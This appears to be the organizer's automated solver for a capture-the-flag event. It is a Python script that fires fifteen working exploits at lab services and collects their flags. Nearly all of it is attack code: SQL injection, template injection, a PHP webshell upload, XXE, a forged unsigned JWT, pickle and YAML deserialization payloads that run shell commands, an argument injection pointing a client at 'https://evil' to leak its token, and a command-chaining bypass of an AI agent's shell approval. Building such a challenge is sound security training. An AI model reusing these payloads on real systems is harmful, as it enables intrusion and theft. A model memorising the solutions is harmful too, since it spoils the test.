#!/usr/bin/env python3
"""
The Backlog — automated solver / organizer self-check.
Runs all 15 exploits against the challenges by service name (in-network).
Pure stdlib. Exits 0 only if all 15 flags are captured.
"""
import sys, re, json, base64, pickle, subprocess, socket, urllib.request, urllib.parse, urllib.error

def http(url, data=None, headers=None, method=None):
    req = urllib.request.Request(url, data=data, headers=headers or {}, method=method)
    try:
        return urllib.request.urlopen(req, timeout=10).read().decode("latin1")
    except urllib.error.HTTPError as e:
        return e.read().decode("latin1")
    except Exception as e:
        return f"ERR:{e}"

def mf(t): m = re.search(r"FLAG\{[^}]*\}", t or ""); return m.group(0) if m else None
R = {}

# c01 — Metacat SQL injection (UNION)
q = "x' UNION SELECT secret, name FROM cn_secrets-- -"
R[1] = mf(http("http://c01/cn/v2/object?nodeId=" + urllib.parse.quote(q)))

# c02 — Drupal Webform Jinja SSTI
pl = "{{ config.__class__.__init__.__globals__['os'].popen('cat /flag').read() }}"
R[2] = mf(http("http://c02/form/contact", data=urllib.parse.urlencode({"message": pl}).encode()))

# c03 — TikTok API SSRF to loopback metadata
R[3] = mf(http("http://c03/api/download?url=" + urllib.parse.quote("http://127.0.0.1:9999/latest")))

# c04 — Dompdf strpos chroot-bypass LFI (sibling dir)
R[4] = mf(http("http://c04/?src=" + urllib.parse.quote("file:///var/www/html-secret/flag.txt")))

# c05 — Cockpit wildcard upload -> webshell RCE
http("http://c05/api/assets/upload?name=sh.php", data=b'<?php system($_GET["c"]); ?>')
R[5] = mf(http("http://c05/uploads/sh.php?c=" + urllib.parse.quote("cat /flag")))

# c06 — mcp-server-kubernetes --server argument injection (token exfil)
R[6] = mf(http("http://c06/tools/get",
               data=json.dumps({"resourceType": "pods", "name": "--server=https://evil"}).encode(),
               headers={"Content-Type": "application/json"}))

# c07 — OpenRemote XXE
xxe = b'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag">]><r>&x;</r>'
R[7] = mf(http("http://c07/asset/import", data=xxe, headers={"Content-Type": "application/xml"}))

# c08 — Termix IDOR
R[8] = mf(http("http://c08/host/db/host/1/password?field=password"))

# c09 — Moodle unsigned-JWT upn forgery
b = lambda o: base64.urlsafe_b64encode(json.dumps(o).encode()).rstrip(b"=").decode()
jwt = b({"alg": "none", "typ": "JWT"}) + "." + b({"upn": "admin@bastion.local"}) + "."
R[9] = mf(http("http://c09/auth/oidc/sso_login?token=" + jwt))

# c10 — Kong percent-encoding RBAC bypass (/%61dmin/flag)
R[10] = mf(http("http://c10/%61dmin/flag"))

# c11 — ComfyUI pickle RCE
class P:
    def __reduce__(self): return (subprocess.check_output, (["cat", "/flag"],))
R[11] = mf(http("http://c11/upload/image", data=pickle.dumps(P()),
                headers={"Content-Type": "application/octet-stream"}))

# c12 — MaxSite PHP object injection (TemplateCache gadget reads /flag)
cookie = base64.b64encode(b'O:13:"TemplateCache":1:{s:8:"template";s:5:"/flag";}').decode()
R[12] = mf(http("http://c12/", headers={"Cookie": "maxsite_comuser=" + cookie}))

# c13 — ModelScope yaml.Loader RCE
y = b'!!python/object/apply:subprocess.check_output [["cat","/flag"]]'
R[13] = mf(http("http://c13/models/load", data=y, headers={"Content-Type": "application/x-yaml"}))

# c14 — Ollama prefix-approval shell bypass
R[14] = mf(http("http://c14/api/tool/run", data=json.dumps({"command": "ls; cat /flag"}).encode(),
                headers={"Content-Type": "application/json"}))

# c15 — ArcadeDB RESP missing auth (raw TCP)
try:
    s = socket.create_connection(("c15", 80), timeout=8)
    s.sendall(b"*2\r\n$3\r\nGET\r\n$4\r\nflag\r\n")
    R[15] = mf(s.recv(4096).decode("latin1")); s.close()
except Exception as e:
    R[15] = None

CATS = {1:"SQLi",2:"SSTI",3:"SSRF",4:"LFI",5:"Upload-RCE",6:"Arg-inj",7:"XXE",8:"IDOR",
        9:"JWT",10:"Authz",11:"Deser(pickle)",12:"Deser(PHP)",13:"AI-YAML-RCE",
        14:"AI-agent",15:"Non-HTTP"}
print("== The Backlog — solver ==")
for i in range(1, 16):
    print(f"  c{i:02d} {CATS[i]:<13} {R.get(i) or '<missing>'}")
ok = all((R.get(i) or "").startswith("FLAG{") for i in range(1, 16))
print("\nRESULT:", "ALL 15 FLAGS CAPTURED" if ok else "INCOMPLETE")
sys.exit(0 if ok else 1)
